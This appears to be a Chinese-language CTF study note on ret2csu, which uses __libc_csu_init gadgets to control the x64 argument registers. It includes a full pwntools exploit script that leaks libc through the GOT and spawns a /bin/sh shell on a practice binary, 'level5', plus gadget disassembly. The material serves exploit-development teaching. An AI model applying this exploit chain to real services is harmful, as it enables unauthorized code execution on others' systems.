# libc_csu gadgets



 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。不同版本的这个函数有一定的区别



libc_csu函数

可以发现0x40061a到0x400624，是将栈上的内容依次放入rbx、rbp、r12、13、14、15，

在0x400600到0x400609处，将r13、14、r15d寄存器中的变量依次分别放入rdx、rsi、edi寄存器，分别对应x64参数传递中的前三个参数，然后调用[r12 + rbx * 8]内存中的存放的函数地址。

所以可以先将数据存入栈中，跳转到0x40061a，将栈中数据入寄存器，要在最后放上返回的地址。

在调用0x400600，转到指定函数执行。

但是函数执行完毕后，会继续往下执行，所以要避免jne再次跳转到0x400600（要在数据入栈是将rbx对应的设置为0，rbp设置为1）。

然后会接着执行add rsp,8 以及6条pop语句，所以要再栈中填充0x38( 8 + 48)字节的数据，最后放上返回地址。

![image-20231125165454633](images/libc_csu%20gadgets.assets/image-20231125165454633.png)



简单示例：

payload

```python
def csu_pop(rbx,rbp,r12,r13,r14,r15,ret,base_addr):
    #跳转到0x400600
    payload = p64(base_addr + 0x40061a)
    payload += p64(rbx) + p64(rbp) + p64(r12)+ p64(r13)+ p64(r14)+ p64(r15)
    
    #0x400600执行完毕，ret返回跳转到0x400609
    payload += p64(base_addr + 0x400600)
    
    #函数调用完毕，填充0x38数据
    payload += b"A" * 0x38
    
    #最后ret返回到主函数
    payload += p64(base_addr + ret)

    return payload


def csu_pop_easy(edi,rsi,rdx,call,ret,base_addr = 0):
    return csu_pop(0,1,call,rdx,rsi,edi,ret,base_addr)



payload = b"A" * 0x88 

got_write = 0x00601018
got_read = 0x00601020
main_addr = 0x00400587

#调用write函数，将write函数的地址打印出来。
payload += csu_pop_easy(1,got_write,8,got_write,main_addr,0)

p.sendline(payload)
```



第一次调用write函数，打印write函数的地址

然和根据write函数的地址，计算出exeve函数地址

第二次调用read函数，将exeve函数地址写入bss，将"/bin/sh\x00"写入bss+8

第三次调用bss处存放的函数（exeve），将bss+8作为第一个参数提交（函数只需要一个参数）

完整payload

```python
#!/usr/bin/env python
from pwn import *

 
context.binary = binary = ELF("./level5",checksec=False)
context.log_level = "debug"

#启动一个进程
p = process()
#p = remote('43.249.195.138',21106)

#获取进程的pid
pid = util.proc.pidof(p)
pid = pid[0]

#等待进程被跟踪
#util.proc.wait_for_debugger(pid)

#pause()

p.recvuntil(b"World\n")

def csu_pop(rbx,rbp,r12,r13,r14,r15,ret,base_addr):
    payload = p64(base_addr + 0x40061a)
    payload += p64(rbx) + p64(rbp) + p64(r12)+ p64(r13)+ p64(r14)+ p64(r15)
    payload += p64(base_addr + 0x400600)
    payload += b"A" * 0x38
    payload += p64(base_addr + ret)

    return payload


def csu_pop_easy(edi,rsi,rdx,call,ret,base_addr = 0):
    return csu_pop(0,1,call,rdx,rsi,edi,ret,base_addr)



payload = b"A" * 0x88 

got_write = 0x00601018
got_read = 0x00601020
main_addr = 0x00400587

payload += csu_pop_easy(1,got_write,8,got_write,main_addr,0)

p.sendline(payload)

libc_write = u64(p.recvn(0x8))
libc_read = libc_write - 0xa0
libc_exeve = libc_write - 0x245E0
libc_system  = libc_write - 0xa8d90
libc_bash_sh = libc_write + 0x996dc

bss = 0x00601040

print(hex(libc_write))
print(hex(libc_bash_sh))

p.recvuntil(b"World\n")



payload = b"A" * 0x88 

payload += csu_pop_easy(0,bss,16,got_read,main_addr,0)

p.sendline(payload)



payload = p64(libc_exeve) + b'/bin/sh' + b'\x00'

p.send(payload)

#00000000000ed630 write 
#00000000000c9050 execve 
# write - exeve = 245E0


p.recvuntil(b"World\n")

payload = b"A" * 0x88 
payload += csu_pop_easy(bss+8,0,0,bss,main_addr,0)

p.sendline(payload)

p.interactive()

```



在上面的程序中，使用了128个字节的，但不是所有的栈溢出程序都允许写入这么多的字节的数据，所以要想办法减少一定的数据写入。

**提前控制 RBX 与 RBP**

利用这两个寄存器的值的主要是为了满足 cmp 的条件，并进行跳转。如果我们可以提前控制这两个数值，那么我们就可以减少 16 字节，即我们所需的字节数只需要 112。



**多次利用**

可以看到 gadgets 是分为两部分的，那么我们其实可以进行两次调用来达到的目的，以便于减少一次 gadgets 所需要的字节数。

例如：

调用数据出栈部分的gadgets，然后返回主函数，进行二次溢出，在调用**函数调用**的gadgets，不过要满足以下两个要求：

- 漏洞可以被多次触发
- 在两次触发之间，程序尚未修改 r12-r15 寄存器。



当然，有时候我们也会遇到一次性可以读入大量的字节，但是不允许漏洞再次利用的情况，这时候就需要我们一次性将所有的字节布置好，之后慢慢利用。



**其他gadget**

除了上述这个 gadgets，gcc 默认还会编译进去一些其它的函数

```
_init
_start
call_gmon_start
deregister_tm_clones
register_tm_clones
__do_global_dtors_aux
frame_dummy
__libc_csu_init
__libc_csu_fini
_fini
```



由于 PC 本身只是将程序的执行地址处的数据传递给 CPU，而 CPU 则只是对传递来的数据进行解码，只要解码成功，就会进行执行。所以可以将源程序中一些地址进行偏移，从而来获取所想要的指令，只要可以确保程序不崩溃。

其中，0x000000000040061A 是正常的起始地址

**在 0x000000000040061f 处可以控制 rbp 寄存器**

**在 0x0000000000400621 处可以控制 rsi 寄存器。**

```
gef➤  x/5i 0x000000000040061A
   0x40061a <__libc_csu_init+90>:   pop    rbx
   0x40061b <__libc_csu_init+91>:   pop    rbp
   0x40061c <__libc_csu_init+92>:   pop    r12
   0x40061e <__libc_csu_init+94>:   pop    r13
   0x400620 <__libc_csu_init+96>:   pop    r14
   
gef➤  x/5i 0x000000000040061f
   0x40061f <__libc_csu_init+95>:   pop    rbp
   0x400620 <__libc_csu_init+96>:   pop    r14
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret

gef➤  x/5i 0x0000000000400621
   0x400621 <__libc_csu_init+97>:   pop    rsi
   0x400622 <__libc_csu_init+98>:   pop    r15
   0x400624 <__libc_csu_init+100>:  ret
```



如果从94开始解析，则`415d`被解析为pop r13

如果从95开始解析，则`5d`被解析为pop rbp

```
90 5b pop rbx
91 5d pop rbp
92 41 pop r12
93 5c
94 41 pop r13
95 5d
96 41 pop r14
97 5e
```



